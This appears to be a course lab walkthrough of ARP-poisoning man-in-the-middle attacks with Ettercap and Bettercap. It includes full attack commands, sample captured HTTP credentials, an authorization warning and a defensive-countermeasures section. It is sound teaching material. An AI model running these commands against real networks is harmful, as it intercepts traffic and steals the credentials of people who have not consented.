# Lab — Ettercap ARP-Poisoning MITM Walkthrough

[← Back to README](../README.md) | [Related: Chapter 5 — Sniffing Tools](../chapters/05-sniffing-tools.md) | [Related: Chapter 4 — MITM Attacks](../chapters/04-mitm-arp-dhcp-spoofing.md)

---

⚠️ **Run this only inside an isolated lab (VMware/VirtualBox) network that you own.** Do not run this against any network you do not have explicit written authorization to test.

## 🎯 Objective

- Use Ettercap to perform an ARP-spoofing MITM attack
- Sniff HTTP credentials and analyze victim traffic
- Understand Ettercap's interactive commands, both CLI and GUI

## 🖥️ Lab Setup

| Role | OS | IP |
|---|---|---|
| Attacker | Kali Linux | `192.168.26.130` |
| Victim | Windows 10 | `192.168.26.134` |
| Gateway/Router | — | `192.168.26.2` |

**Topology:**
```
[Victim: 192.168.26.134]  <--->  [Router: 192.168.26.2]  <--->  [Internet]
              │                          ^
              │                          │
              └────────────► [Attacker: 192.168.26.130] ◄───┘
```

---

## Step 1 — Verify Network Connectivity

**On Kali (attacker):**
```bash
ip r
```
Expected output:
```
default via 192.168.26.2 dev eth0
192.168.26.0/24 dev eth0 proto kernel scope link src 192.168.26.130
```

**On Windows (victim):**
```
ipconfig
```
Confirm the victim shows an IP in the same subnet (`192.168.26.134`) with gateway `192.168.26.2`.

---

## Step 2 — Enable IP Forwarding

Since the attacker will sit *in the middle* of the traffic flow, the attacker's machine must forward packets between the victim and the real gateway — otherwise the victim loses internet access entirely and the attack is instantly obvious.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

Confirm it's enabled:
```bash
cat /proc/sys/net/ipv4/ip_forward
```
Expected output: `1`

---

## Step 3 — Launch Ettercap (Text Mode)

```bash
ettercap -T -M arp:remote /192.168.26.134/ /192.168.26.2/
```

**Breakdown:**
| Flag/Arg | Meaning |
|---|---|
| `-T` | Text mode (console-based) |
| `-M arp:remote` | MITM attack using ARP spoofing |
| `/192.168.26.134/` | First target — Windows 10 victim |
| `/192.168.26.2/` | Second target — Router/gateway |

So the attacker poisons ARP tables of *both* the victim and the gateway. This means the attacker poisons the ARP tables of both the victim and the gateway.

**Expected output:**
```
ettercap NG-0.8.3 copyright 2001-2020
Listening on eth0...
ARP poisoning victims:
    /192.168.26.134/  -->  /192.168.26.2/
Unified sniffing...
Starting Unified sniffing...
MITM attack started...
```

---

## Step 4 — Sniff Victim's Traffic

On the victim's Windows 10 browser, navigate to a deliberately vulnerable, HTTP-only test site (e.g., a self-hosted vulnerable web app used for training):

```
http://testphp.vulnweb.com/login.php
```

Log in with any dummy credentials (e.g., `admin` : `1234`).

**On the Kali Ettercap window, you should see something like:**
```
HTTP : [192.168.26.134:12345 -> 192.168.26.2:80]
POST /login.php
USER=admin&PASS=1234
```

🎯 **Credentials captured** — in plaintext, exactly as they crossed the wire, because the site used HTTP instead of HTTPS.

---

## Step 5 — Using the GUI (Optional for Students)

Open Ettercap GUI:
```bash
ettercap -G
```

**Steps:**
1. `Sniff → Unified Sniffing → Select eth0`
2. `Hosts → Scan for Hosts`
   - Gateway: `192.168.26.2`
   - Victim: `192.168.26.134`
3. **Add targets:**
   - Target 1 → Victim
   - Target 2 → Gateway
4. `Mitm → ARP poisoning → Sniff remote connections`
5. `Start → Start sniffing`

Now monitor the logs → captured usernames/passwords will show in the bottom panel, just as in text mode.

---

## Step 6 — Save Captured Data

```bash
ettercap -T -M arp:remote /192.168.26.134/ /192.168.26.2/ -L sniff_log
```

This saves logs into `sniff_log.eci` (viewable later with `etterlog`).

**View captured logs:**
```bash
etterlog sniff_log.eci
```

---

## Step 7 — Stop the Attack

Once the demo is over, **always clean up** — an open MITM session left running is both a security hazard and a giveaway.

**Stop poisoning:**
```
Ctrl + C
```

**Disable IP forwarding again:**
```bash
echo 0 > /proc/sys/net/ipv4/ip_forward
```

---

## 🔎 Limitations of This Lab

- Works only on **HTTP, FTP, Telnet** (unencrypted protocols)
- Will **NOT** capture HTTPS passwords directly — TLS encryption blocks this exact technique (see [Chapter 6 — SSL Stripping](../chapters/06-ssl-stripping.md) for how attackers get around that)

## 🛡️ Defense Demonstration (Do This Too)

After running the attack, demonstrate the fix side by side:
- **Always use HTTPS** — even on internal tools
- **Use a VPN** — encrypts traffic even on hostile/untrusted networks
- **Enable ARP spoofing detection** — via tools like arpwatch, XArp, or switch port security
- **Deploy IDS/IPS** — to flag the anomalous ARP broadcasts this lab generates

---

## Bettercap Variant (Modern Alternative)

The same lab objective — ARP spoofing MITM + HTTP credential sniffing — can be repeated with **Bettercap**, a more actively maintained successor to Ettercap.

**Objective:**
- Use Bettercap to perform ARP-spoofing MITM
- Sniff HTTP credentials and analyze victim traffic
- Understand Bettercap's interactive command syntax

**Lab setup:** identical topology (Attacker: `192.168.26.130`, Victim: `192.168.26.134`, Gateway: `192.168.26.2`)

```bash
sudo bettercap -iface eth0
```

Inside the Bettercap interactive shell:
```
net.probe on
set arp.spoof.targets 192.168.26.134
arp.spoof on
net.sniff on
```

Bettercap's `net.sniff` module will surface HTTP credentials in the same way Ettercap does, plus gives you scriptable caplets for repeatable lab exercises.

---

[← Back to README](../README.md) | [Related: Chapter 5 — Sniffing Tools](../chapters/05-sniffing-tools.md) | [Next: Chapter 6 — SSL Stripping →](../chapters/06-ssl-stripping.md)
